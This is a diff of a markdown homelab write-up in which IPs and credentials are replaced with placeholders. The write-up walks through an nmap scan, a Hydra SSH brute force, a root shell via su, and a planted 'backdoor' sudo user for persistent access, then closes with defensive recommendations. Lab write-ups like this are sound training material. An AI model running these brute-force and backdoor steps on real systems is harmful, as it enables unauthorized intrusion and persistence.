@@ -18,9 +18,9 @@ My goal is to find active hosts, identify a target, and gain SSH access via brut
 ```mermaid
 flowchart TD
     A([cs20 - Kali Linux]) -->|nmap -sn| B[Discover hosts on network]
-    B -->|nmap -sV 192.168.1.133| C[Port 22 SSH open on cs33]
-    C -->|Hydra brute force| D[Credentials found: swagvict / victim]
-    D -->|ssh swagvict@cs33| E[Inside cs33 as swagvict]
+    B -->|nmap -sV 192.capy.1.capy| C[Port 22 SSH open on cs33]
+    C -->|Hydra brute force| D[Credentials found: [capybara-priv] / [capybara-priv]]
+    D -->|ssh [capybara-priv]@cs33| E[Inside cs33 as [capybara-priv]]
     E -->|find SUID binaries| F[su - → root shell]
     F -->|useradd backdoor| G[Backdoor user created]
     G -->|ssh backdoor@cs33| H[Persistent access established]
@@ -40,17 +40,17 @@ flowchart TD
 ### 1. Network scan - discover active hosts
 
 ```bash
-nmap -sn 192.168.1.0/24
+nmap -sn 192.capy.1.capy/24
 ```
 
 This shows all active devices on the network.
 
-From the scan, multiple Proxmox devices appear (MAC prefix `BC:24:11`). Since cs33 is an LXC container, it doesn't appear with a hostname - I identify it via the Proxmox host (`pct exec 33 -- ip a`), which confirms cs33 is at `192.168.1.133`.
+From the scan, multiple Proxmox devices appear (MAC prefix `BC:24:11`). Since cs33 is an LXC container, it doesn't appear with a hostname - I identify it via the Proxmox host (`pct exec 33 -- ip a`), which confirms cs33 is at `192.capy.1.capy`.
 
 ### 2. Port scan - find open services on the target
 
 ```bash
-nmap -sV 192.168.1.133
+nmap -sV 192.capy.1.capy
 ```
 
 Port 22 (SSH) is open - running OpenSSH 8.9p1 on Ubuntu. The target is vulnerable to brute force.
@@ -60,19 +60,19 @@ Port 22 (SSH) is open - running OpenSSH 8.9p1 on Ubuntu. The target is vulnerabl
 > In a real scenario I would use the full `rockyou.txt` wordlist (14M passwords). Here I used a short custom wordlist for speed.
 
 ```bash
-hydra -l swagvict -P /tmp/test-passwords.txt -t 4 -V ssh://192.168.1.133
+hydra -l [capybara-priv] -P /tmp/test-passwords.txt -t 4 -V ssh://192.capy.1.capy
 ```
 
 Hydra found the credentials:
 ```
-[22][ssh] host: 192.168.1.133   login: swagvict   password: victim
+[22][ssh] host: 192.capy.1.capy   login: [capybara-priv]   password: [capybara-priv]
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 ### 4. Login with cracked password
 
 ```bash
-ssh swagvict@192.168.1.133
+ssh [capybara-priv]@192.capy.1.capy
 ```
 
 ---
@@ -101,10 +101,10 @@ passwd backdoor
 usermod -aG sudo backdoor
 ```
 
-From cs20, persistent access is now available even if `swagvict` is removed:
+From cs20, persistent access is now available even if `[capybara-priv]` is removed:
 
 ```bash
-ssh backdoor@192.168.1.133
+ssh backdoor@192.capy.1.capy
 ```
 
 ---
@@ -135,7 +135,7 @@ cs55 also detected:
 
 ## AI Observations
 
-- **Weak password on a critical user:** `swagvict` had password `victim` - cracked instantly. In a real environment, password policies and account lockout after N failed attempts are essential.
+- **Weak password on a critical user:** `[capybara-priv]` had password `[capybara-priv]` - cracked instantly. In a real environment, password policies and account lockout after N failed attempts are essential.
 - **Root password accessible via `su`:** privilege escalation was trivial. `su` should be restricted or root password disabled entirely in favor of `sudo` with per-user rules.
 - **LXC containers are not isolated at network level:** cs33 was reachable from the entire LAN with no firewall rules. A proper setup would restrict inbound SSH to trusted IPs only.
 - **Wazuh detected everything but didn't block anything:** Wazuh in this setup is passive (SIEM only). To actively block attacks, `active-response` rules need to be configured - e.g. auto-ban IPs after X failed SSH attempts via `fail2ban` integration.
